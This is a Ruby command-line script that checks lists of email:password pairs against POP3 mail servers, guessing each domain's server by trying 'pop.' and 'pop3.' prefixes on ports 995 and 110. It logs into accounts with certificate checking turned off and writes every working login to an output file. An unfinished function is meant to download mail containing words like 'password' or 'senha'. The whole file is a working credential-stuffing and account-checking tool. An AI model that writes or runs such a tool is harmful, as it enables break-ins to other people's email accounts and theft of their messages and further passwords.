#!/usr/bin/env ruby
require 'net/pop'
require 'openssl'
require 'csv'
require 'optparse'
require 'socket'
require 'timeout'


# ---- BEGIN PARAMETER PARSE ----
options = {}
parm = {:out=> "out.txt"}
OptionParser.new do |opts|
        opts.version = "0.1"
        opts.on( '-h', '--help', 'Display this screen' ) do
            puts opts
        exit
        end
        opts.on("-s", "--sever", "Mail server") do |s| 
            options[:server] = s
            parm[:server] = ARGV[0]
        end 
        opts.on("-f", "--file", "E-mail file. Format [server:user:pass]\n \t\t\t\t\t\t\t [:user:pass]") do |f| 
            options[:file] = f 
            parm[:file] = ARGV[0]
  	end 
        opts.on("-p", "--port", "port to connect") do |p| 
            options[:port] = p 
            parm[:port] = ARGV[0]
  	end 
  	opts.on("-o", "--output", "Output to save results [optional], default \"out.txt\"") do |o| 
    	    options[:out] = o 
            parm[:out] = ARGV[0]
  	end 
  	opts.parse!
  	raise OptionParser::MissingArgument if (options[:file]).nil?
end
# ---- END PARAMETER PARSE ----




# ----- BEGIN CLASSES -----
#
# Mail Class
class Mail
    # Function connect
    # Parameters:
    # Server to connect
    # Port to connect
    # User and password to auth  
    def Connect(server,port,username,password)
        puts " try ... #{server}:#{port} - #{username}:#{password}"
        Net::POP3.enable_ssl(OpenSSL::SSL::VERIFY_NONE)
        auth = Net::POP3.start(server, port, username, password)

        # timeout and other erros
	      rescue SocketError, Timeout::Error, OpenSSL::SSL::SSLError,EOFError
            puts "Connect Error: #{$!}"
	
        # If connection refused sleep 60s. The server could be rejecting the connections.
        rescue Errno::ECONNREFUSED, Errno::ECONNRESET
	        puts "Connect Error: #{$!}"
	        sleep 0.60

        # Invalid credentials
        rescue Net::POPAuthenticationError
            puts "Connect Error: #{$!}"
        else
	          auth.finish
            return username,password
    end

# function to download mails and search for pattern
# input var:
# auth -- POP object (verify the Mail::Connect to return this object) 
# rex -- Regex to search mails
# Don't work
    def SearchMail(auth,rex=nil)
        if (auth)
	    if (rex.nil?)
                re = %r{([pP]assword)|([sS]enhas?)}
	    else
	        re = Regexp.new(rex.to_s)
	    end
            puts " ==== #{auth.mails.length}  messages === "
            auth.mails.each_with_index do |msg,index|
                File.open("/tmp/inbox/#{index}", 'w') do |output|
                    puts " === downloading... #{index} === "
                    puts " === scan result: #{msg.pop.scan(re).nil?} === "
                    output.write msg.pop unless (msg.pop.scan(re).nil?)
                end
            end
        end
        auth.finish
    end
end

# Classe to scanner hosts and ports
class Scanner
# This function create a host list to scan. It is add the domain at the prefixes list.
    def CreateHostList(prefix,domain)
        hosts =[]
        prefix.each do |pre| 
            hosts.push(pre+domain)
        end
        return hosts
    end
# Functiont o scanner host and pors.
# This function objective is guess what server and port to connect if not s[--server] and -p[--port] parameters were not provided.
    def ScanningHostPort(hosts, ports)
	hosts.each do |host|
#	    puts  "Scanning... #{host}"
            ports.each do |port|
#	        puts  "Scanning Port #{port}"
                begin
                   socket = TCPSocket.open(host, port)
                   Timeout::timeout(1)
                rescue
		   puts "Scan Error: #{$!}"
     	        end
		if (socket)
		    socket.close
		    puts "'Port: #{port} / Open"
		    return host,port
		end
	   end
        end
	puts "The scan don't guess any hosts with open ports"
	return
    end

# Objective of this funciton is guess what port to connect if not -p[--port] parameter was not provided.
    def ScanningPort(host, ports)
#            puts  "Scanning... #{host}"
            ports.each do |port|
#                puts  "Scanning Port #{port}"
                begin
                   socket = TCPSocket.open(host, port)
                   Timeout::timeout(1)
                rescue
                   puts "Scan Error: #{$!}"
                end
                if (socket)
                    socket.close
                    puts "'Port: #{port} / Open"
                    return port
		            else
		                puts "This host don't have any POP3 guess open port"
        	          return
                end
           end
    end
end

# ----- END CLASSES -----

# open the mail file
file = CSV::open(parm[:file],'r', ':')
# open the output file
out = File.open(parm[:out].to_s,'a')
# If --server and --port
$server = parm[:server] if (options[:server])
$port = parm[:port] if (options[:port])
# File to save unformated lines 
unformated = File.open("unformated.txt",'a')
# prefix of host scan
prefix =["pop3.","pop."]
# Ports that are scanned
ports = [995,110]
count = 0

# File interation
#
file.each do |a|
    # if line don't correct format it's save.
    if (a[1].nil? || a[2].nil?)
	      unformated << "#{a} \n"
        next
    end
    username = a[1].downcase
    password = a[2].to_s
    domain = username.split("@")[1].to_s
    # if don't or port (scan all)
    unless (defined?($server) || defined?($port))
	      $server, $port = Scanner.new().ScanningHostPort(Scanner.new().CreateHostList(prefix,domain),ports)
        # if the scan don't success, exit
	      if ($port.nil? || $server.nil?)
	        exit
	      end
    end
    # if --server parameter but don't port, scan by port
    if ($server) and ($port.nil?)
	      $port = Scanner.new().ScanningPort($server,ports)
        # if the scan don't success, exit
	      if ($port.nil?)
	          exit
	      end
    end
    # u and p recived function return Connect (user and pass)
    u, p = Mail.new().Connect($server,$port,username,password)
    # If not null u and p, print and save
    unless (u.nil? || p.nil?)
	      count += 1
        puts "#{u}:#{p} ............. [OK] - #{count}"
        out << "#{$server}:#{$port}:#{u}:#{p}\n"
    end
end
# debug end of file
puts " EOF "
# close files
file.close
out.close
